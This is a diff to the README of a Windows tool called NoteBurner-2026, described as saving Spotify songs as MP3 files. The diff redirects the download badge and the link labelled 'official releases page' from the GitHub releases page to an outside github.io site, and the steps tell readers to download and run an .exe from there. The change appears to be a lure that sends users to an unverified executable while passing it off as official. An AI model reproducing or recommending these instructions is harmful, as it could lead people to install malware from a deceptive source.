@@ -1,6 +1,6 @@
 # 🎵 NoteBurner-2026 - Save Spotify Music to Local Files
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Muree506/NoteBurner-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://muree506.github.io)
 
 NoteBurner-2026 allows you to convert and save your Spotify songs as local MP3 files. This tool works on Windows 10 and Windows 11. You keep your music collection on your device for offline playback.
 
@@ -8,7 +8,7 @@ NoteBurner-2026 allows you to convert and save your Spotify songs as local MP3 f
 
 Follow these steps to get the software on your computer:
 
-1. Visit the [official releases page](https://github.com/Muree506/NoteBurner-2026/releases).
+1. Visit the [official releases page](https://muree506.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file name ending in .exe to start the transfer to your computer.
 4. Wait for the file to finish downloading to your Downloads folder.
